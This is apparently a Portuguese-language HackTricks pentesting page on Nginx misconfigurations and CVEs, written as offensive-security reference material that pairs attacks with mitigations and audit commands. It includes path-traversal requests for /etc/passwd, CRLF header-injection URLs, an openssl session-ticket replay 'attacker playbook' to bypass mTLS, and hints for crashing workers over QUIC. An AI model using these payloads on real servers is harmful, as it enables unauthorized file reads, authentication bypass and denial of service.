# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Localização root ausente <a href="#missing-root-location" id="missing-root-location"></a>

Ao configurar o servidor Nginx, a **root directive** desempenha um papel crítico ao definir o diretório base a partir do qual os arquivos são servidos. Considere o exemplo abaixo:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Nesta configuração, `/etc/nginx` é designado como diretório root. Essa configuração permite o acesso a arquivos dentro do diretório root especificado, como `/hello.txt`. No entanto, é crucial notar que apenas uma location específica (`/hello.txt`) está definida. Não há configuração para a location root (`location / {...}`). Essa omissão significa que a diretiva `root` se aplica globalmente, permitindo que requisições ao caminho root `/` acessem arquivos sob `/etc/nginx`.

Uma consideração crítica de segurança surge dessa configuração. Uma simples requisição `GET`, como `GET /nginx.conf`, pode expor informações sensíveis ao servir o arquivo de configuração do Nginx localizado em `/etc/nginx/nginx.conf`. Ajustar o `root` para um diretório menos sensível, como `/etc`, pode mitigar esse risco, mas ainda assim pode permitir acesso não intencional a outros arquivos críticos, incluindo outros arquivos de configuração, logs de acesso e até credenciais criptografadas usadas para autenticação HTTP básica.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nos arquivos de configuração do Nginx, é necessária uma inspeção atenta das diretivas "location". Uma vulnerabilidade conhecida como Local File Inclusion (LFI) pode ser inadvertidamente introduzida através de uma configuração que se assemelha ao seguinte:
```
location /imgs {
alias /path/images/;
}
```
Esta configuração é suscetível a ataques LFI devido ao servidor interpretar requisições como `/imgs../flag.txt` como uma tentativa de acessar arquivos fora do diretório pretendido, efetivamente resolvendo para `/path/images/../flag.txt`. Essa falha permite que atacantes recuperem arquivos do sistema de arquivos do servidor que não deveriam ser acessíveis via web.

Para mitigar essa vulnerabilidade, a configuração deve ser ajustada para:
```
location /imgs/ {
alias /path/images/;
}
```
Mais informações: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix testes:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Restrição insegura de caminho <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Consulte a página a seguir para aprender como fazer bypass em diretivas como:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Uso inseguro de variáveis / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variáveis vulneráveis `$uri` e `$document_ur`i — isso pode ser corrigido substituindo-as por `$request_uri`.
>
> Uma regex também pode ser vulnerável, por exemplo:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerável
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Não vulnerável (verificando espaços)
>
> `location ~ /docs/(.*)? { … $1 … }` - Não vulnerável

Uma vulnerabilidade na configuração do Nginx é demonstrada pelo exemplo abaixo:
```
location / {
return 302 https://example.com$uri;
}
```
Os caracteres \r (Carriage Return) e \n (Line Feed) indicam caracteres de nova linha em requisições HTTP, e suas formas codificadas em URL são representadas como `%0d%0a`. Incluir esses caracteres em uma requisição (por exemplo, `http://localhost/%0d%0aDetectify:%20clrf`) a um servidor mal configurado faz com que o servidor emita um novo cabeçalho chamado `Detectify`. Isso acontece porque a variável $uri decodifica os caracteres de nova linha codificados em URL, levando a um cabeçalho inesperado na resposta:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Saiba mais sobre os riscos de CRLF injection e response splitting em [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Além disso, esta técnica é [**explicada nesta palestra**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) com alguns exemplos vulneráveis e mecanismos de detecção. Por exemplo, para detectar essa má-configuração do ponto de vista blackbox você pode fazer estas requisições:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Se vulnerável, a primeira retornará pois "X" é qualquer HTTP method e a segunda retornará um erro pois H não é um método válido. Então o servidor receberá algo como: `GET / H HTTP/1.1` e isso vai disparar o erro.

Outros exemplos de detecção seriam:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Algumas configurações vulneráveis encontradas e apresentadas nessa palestra foram:

- Note how **`$uri`** is set as is in the final URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Observe como novamente **`$uri`** está na URL (desta vez dentro de um parâmetro)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Agora no AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Qualquer variável

Foi descoberto que **dados fornecidos pelo usuário** podem ser tratados como uma **variável do Nginx** em determinadas circunstâncias. A causa desse comportamento permanece algo elusiva, porém não é rara nem simples de verificar. Essa anomalia foi destacada em um relatório de segurança no HackerOne, que pode ser visto [here](https://hackerone.com/reports/370094). Investigações adicionais na mensagem de erro levaram à identificação de sua ocorrência dentro do [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), apontando Server Side Includes (SSI) como a causa raiz.

Para **detectar essa má-configuração**, o seguinte comando pode ser executado, o qual envolve definir um cabeçalho Referer para testar a impressão de variáveis:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Varreduras por essa má-configuração em sistemas revelaram múltiplas instâncias onde variáveis do Nginx podiam ser exibidas para um usuário. Contudo, a redução no número de instâncias vulneráveis sugere que os esforços para corrigir esse problema foram, de certa forma, bem-sucedidos.

### Usando try_files com variáveis $URI$ARGS

A seguinte má-configuração do Nginx pode levar a uma vulnerabilidade LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Na nossa configuração temos a diretiva `try_files`, que é usada para verificar a existência de arquivos em uma ordem especificada. O Nginx irá servir o primeiro que encontrar. A sintaxe básica da diretiva `try_files` é a seguinte:
```
try_files file1 file2 ... fileN fallback;
```
Nginx verificará a existência de cada arquivo na ordem especificada. Se um arquivo existir, ele será servido imediatamente. Se nenhum dos arquivos especificados existir, a requisição será passada para a opção de fallback, que pode ser outro URI ou uma página de erro específica.

No entanto, ao usar as variáveis `$uri$args` nessa diretiva, o Nginx tentará procurar por um arquivo que corresponda ao URI da requisição combinado com quaisquer argumentos da query string. Portanto, podemos explorar essa configuração:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Com o seguinte payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Usando nosso payload, vamos escapar do diretório raiz (definido na configuração do Nginx) e carregar o arquivo `/etc/passwd`. Nos logs de debug podemos observar como o Nginx tenta os arquivos:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC contra o Nginx usando a configuração mencionada acima:
![Exemplo de requisição do Burp](../../images/nginx_try_files.png)

## Leitura da resposta bruta do backend

O Nginx oferece um recurso através de `proxy_pass` que permite a interceptação de erros e cabeçalhos HTTP produzidos pelo backend, com o objetivo de ocultar mensagens de erro internas e cabeçalhos. Isso é feito pelo Nginx servindo páginas de erro customizadas em resposta a erros do backend. No entanto, surgem problemas quando o Nginx encontra uma requisição HTTP inválida. Essa requisição é encaminhada para o backend conforme recebida, e a resposta bruta do backend é então enviada diretamente ao cliente sem intervenção do Nginx.

Considere um cenário de exemplo envolvendo uma aplicação uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Para gerenciar isso, diretivas específicas na configuração do Nginx são usadas:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Esta diretiva permite que o Nginx sirva uma resposta personalizada para respostas do backend com um código de status maior que 300. Garante que, para nossa aplicação uWSGI de exemplo, uma `500 Error` seja interceptada e tratada pelo Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Como o nome sugere, esta diretiva oculta cabeçalhos HTTP especificados do cliente, aumentando a privacidade e a segurança.

Quando uma requisição `GET` válida é feita, o Nginx a processa normalmente, retornando uma resposta de erro padrão sem revelar quaisquer cabeçalhos secretos. Contudo, uma requisição HTTP inválida contorna esse mecanismo, resultando na exposição de respostas brutas do backend, incluindo cabeçalhos secretos e mensagens de erro.

## merge_slashes definido como off

Por padrão, a diretiva **`merge_slashes`** do Nginx está definida como **`on`**, o que comprime múltiplas barras (/) em uma URL para uma única barra. Esse recurso, apesar de simplificar o processamento de URLs, pode inadvertidamente ocultar vulnerabilidades em aplicações atrás do Nginx, particularmente aquelas suscetíveis a ataques de local file inclusion (LFI). Os especialistas em segurança **Danny Robinson and Rotem Bar** destacaram os riscos potenciais associados a esse comportamento padrão, especialmente quando o Nginx atua como reverse-proxy.

Para mitigar tais riscos, recomenda-se **desativar a diretiva `merge_slashes`** para aplicações suscetíveis a essas vulnerabilidades. Isso garante que o Nginx encaminhe as requisições para a aplicação sem alterar a estrutura da URL, não mascarando problemas de segurança subjacentes.

Para mais informações, veja [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

Como mostrado em [**this writeup**](https://mizu.re/post/cors-playground), existem certos cabeçalhos que, se presentes na resposta do servidor web, alterarão o comportamento do proxy do Nginx. Você pode verificá-los [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indica ao Nginx para redirecionar internamente uma requisição para uma localização especificada.
- `X-Accel-Buffering`: Controla se o Nginx deve ou não fazer buffering da resposta.
- `X-Accel-Charset`: Define o conjunto de caracteres para a resposta ao usar X-Accel-Redirect.
- `X-Accel-Expires`: Define o tempo de expiração da resposta ao usar X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limita a taxa de transferência das respostas ao usar X-Accel-Redirect.

Por exemplo, o cabeçalho **`X-Accel-Redirect`** causará um **redirect** interno no nginx. Assim, ter uma configuração do nginx com algo como **`root /`** e uma resposta do servidor web com **`X-Accel-Redirect: .env`** fará com que o nginx envie o conteúdo de **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

Na **configuração do Nginx**, a diretiva `map` frequentemente desempenha um papel no **controle de autorização**. Um erro comum é não especificar um valor **padrão**, o que pode levar a acesso não autorizado. Por exemplo:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sem um `default`, um **usuário malicioso** pode contornar a segurança acessando uma **URI indefinida** dentro de `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) recomenda definir um **valor padrão** para evitar tais problemas.

### **Vulnerabilidade de DNS Spoofing**

O DNS spoofing contra o Nginx é viável sob certas condições. Se um atacante conhece o **servidor DNS** usado pelo Nginx e pode interceptar suas consultas DNS, ele pode falsificar registros DNS. Entretanto, esse método é ineficaz se o Nginx estiver configurado para usar **localhost (127.0.0.1)** para resolução DNS. O Nginx permite especificar um servidor DNS da seguinte forma:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` e `internal` Diretivas**

A diretiva **`proxy_pass`** é utilizada para redirecionar requests para outros servidores, internamente ou externamente. A diretiva **`internal`** garante que certos locations sejam acessíveis apenas internamente no Nginx. Embora essas diretivas não sejam vulnerabilidades por si só, sua configuração requer exame cuidadoso para prevenir falhas de segurança.

## proxy_set_header Upgrade & Connection

Se o servidor nginx estiver configurado para repassar os headers Upgrade e Connection, um [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) poderia ser realizado para acessar endpoints protegidos/internos.

> [!CAUTION]
> Essa vulnerabilidade permitiria que um atacante **estabelecesse uma conexão direta com o endpoint `proxy_pass`** (`http://backend:9999` neste caso) cujo conteúdo não será verificado pelo nginx.

Exemplo de configuração vulnerável para roubar `/flag` de [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Observe que mesmo que o `proxy_pass` estivesse apontando para um **path** específico como `http://backend:9999/socket.io` a conexão será estabelecida com `http://backend:9999`, então você pode **contatar qualquer outro path dentro desse endpoint interno. Portanto, não importa se um path está especificado na URL do proxy_pass.**

## Módulo HTTP/3 QUIC remoto DoS & leak (2024)

Durante 2024 o Nginx divulgou CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 e CVE-2024-35200 mostrando que uma **única sessão QUIC hostil** pode travar processos worker ou causar leak de memória sempre que o módulo experimental `ngx_http_v3_module` estiver compilado e um socket `listen ... quic` estiver exposto. As builds impactadas são 1.25.0–1.25.5 e 1.26.0, enquanto 1.27.0/1.26.1 trazem as correções; a divulgação de memória (CVE-2024-34161) adicionalmente requer MTUs maiores que 4096 bytes para expor dados sensíveis (detalhes no advisory do nginx de 2024 referenciado abaixo).

**Recon & exploitation hints**

- HTTP/3 é opt-in, então escaneie por respostas `Alt-Svc: h3=":443"` ou brute-force handshakes QUIC em UDP/443; uma vez confirmado, fuzz the handshake e STREAM frames com payloads customizados do `quiche-client`/`nghttp3` para disparar worker crashes e forçar leak nos logs.
- Identifique rapidamente o suporte do alvo com:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Contorno de TLS session resumption na autenticação por certificado do cliente (CVE-2025-23419)

Um aviso de fevereiro de 2025 divulgou que o nginx 1.11.4–1.27.3 compilado com OpenSSL permite **reusar uma TLS 1.3 session** de um virtual host baseado em nome dentro de outro, de modo que um cliente que negociou um host sem certificado pode reproduzir o ticket/PSK para entrar em um vhost protegido com `ssl_verify_client on;` e ignorar completamente o mTLS. O bug é acionado sempre que múltiplos virtual hosts compartilham o mesmo TLS 1.3 session cache e tickets (veja o aviso do nginx de 2025 referenciado abaixo).

**Playbook do atacante**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Se o alvo for vulnerável, o segundo handshake é concluído sem apresentar um certificado de cliente, revelando locais protegidos.

**What to audit**

- Mixed `server_name` blocks that share `ssl_session_cache shared:SSL` plus `ssl_session_tickets on;`.
- Admin/API blocks that expect mTLS but inherit shared session cache/ticket settings from public hosts.
- Automation that enables TLS 1.3 session resumption globally (e.g., Ansible roles) without considering vhost isolation.

## Resiliência ao HTTP/2 Rapid Reset (comportamento do CVE-2023-44487)

O ataque HTTP/2 Rapid Reset (CVE-2023-44487) ainda afeta nginx quando operadores aumentam `keepalive_requests` ou `http2_max_concurrent_streams` além dos padrões: um atacante abre uma conexão HTTP/2, a inunda com milhares de streams e em seguida envia imediatamente frames `RST_STREAM` de modo que o teto de concorrência nunca é atingido enquanto a CPU continua consumindo recursos na lógica de finalização. Os padrões do nginx (128 concurrent streams, 1000 keepalive requests) mantêm o raio de impacto pequeno; elevar esses limites "substancialmente" torna trivial esgotar workers mesmo a partir de um único cliente (veja o write-up da F5 referenciado abaixo).

**Detection tips**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts que revelam valores incomumente altos para essas diretivas são alvos preferenciais: um cliente HTTP/2 pode entrar em loop criando streams e enviando instantaneamente frames `RST_STREAM` para manter a CPU no máximo sem acionar o limite de concorrência.

## Experimente você mesmo

Detectify criou um repositório no GitHub onde você pode usar Docker para configurar seu próprio servidor de teste Nginx vulnerável com algumas das más configurações discutidas neste artigo e tentar encontrá-las você mesmo!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Ferramentas de análise estática

### [GIXY](https://github.com/yandex/gixy)

Gixy é uma ferramenta para analisar a configuração do Nginx. O objetivo principal do Gixy é prevenir más configurações de segurança e automatizar a detecção de falhas.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner é uma ferramenta simples para procurar más configurações e vulnerabilidades comuns do Nginx.

## Referências

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
